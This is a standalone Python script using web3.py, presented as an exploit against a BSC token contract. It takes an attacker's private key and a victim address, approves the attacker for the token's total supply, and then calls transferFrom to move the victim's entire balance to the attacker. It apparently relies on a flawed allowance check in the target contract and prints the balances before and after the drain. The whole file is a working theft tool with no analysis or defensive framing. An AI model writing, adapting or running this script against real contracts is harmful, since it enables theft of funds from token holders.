from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Exploit Code Amount Check")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)
contract_address = w3.toChecksumAddress(args.token_address)
attacker_address = account.address
victim_address = w3.toChecksumAddress(args.victim_address)

# ===== TOKEN ABI =====
TOKEN_ABI = [
    #  Include only the necessary functions
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "approve",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "totalSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }

]

# ===== CORE FUNCTIONS =====
def send_transaction(account, contract_function, value=0, gas=300000, retries=3, delay=5):
    """Robust transaction sending with retries and gas management"""
    for attempt in range(retries):
        try:
            tx = contract_function.build_transaction({
                "from": account.address,
                "nonce": w3.eth.get_transaction_count(account.address),
                "gas": gas,
                "gasPrice": int(w3.eth.gas_price * 1.2),
                "value": value
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return w3.eth.wait_for_transaction_receipt(tx_hash)
        except exceptions.TransactionNotFound:
            if attempt == retries - 1:
                raise
            time.sleep(delay)
        except ValueError as e:
            if "replacement transaction underpriced" in str(e) and attempt < retries - 1:
                time.sleep(delay)
                continue
            raise



def execute_exploit():
    """Main exploit execution flow"""
    token = w3.eth.contract(address=contract_address, abi=TOKEN_ABI)

    print(f"\n[+] Target Contract: {contract_address}")
    print(f"[+] Attacker Address: {attacker_address}")
    print(f"[+] Victim Address: {victim_address}")

    # Get Victim's Initial Balance
    victim_initial_balance = token.functions.balanceOf(victim_address).call()
    print(f"[+] Victim Initial Balance: {victim_initial_balance}")

    # Get Total Supply
    total_supply = token.functions.totalSupply().call()
    print(f"[+] Total Supply: {total_supply}")

    # Step 1: Attacker approves themselves for total supply
    print("\n[1] Attacker approving themselves for total supply...")
    try:
        receipt = send_transaction(
            account,
            token.functions.approve(attacker_address, total_supply),
            gas=400000
        )
        print(f"Approve TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
        if receipt.status != 1:
            print("Approve transaction failed. Exiting.")
            return
    except Exception as e:
        print(f"Approve call failed: {e}")
        return

    # Step 2: Attacker calls transferFrom with a calculated amount
    print("\n[2] Attacker calling transferFrom with calculated amount...")
    amount_to_transfer = min(victim_initial_balance, total_supply)  # Transfer the smaller of the two
    try:
        receipt = send_transaction(
            account,
            token.functions.transferFrom(
                victim_address,
                attacker_address,
                amount_to_transfer
            ),
            gas=400000
        )

        print("\n[+] Transfer Results:")
        print(f"TX Hash: {receipt.transactionHash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {receipt.gasUsed}")

        # Final verification
        victim_final_balance = token.functions.balanceOf(victim_address).call()
        print(f"[+] Victim Final Balance: {victim_final_balance}")
        attacker_final_balance = token.functions.balanceOf(attacker_address).call()
        print(f"[+] Attacker Final Balance: {attacker_final_balance}")

    except Exception as e:
        print(f"\n[!] Transfer failed: {str(e)}")
        print("Exploit Unsuccessful")


if __name__ == "__main__":
    execute_exploit()
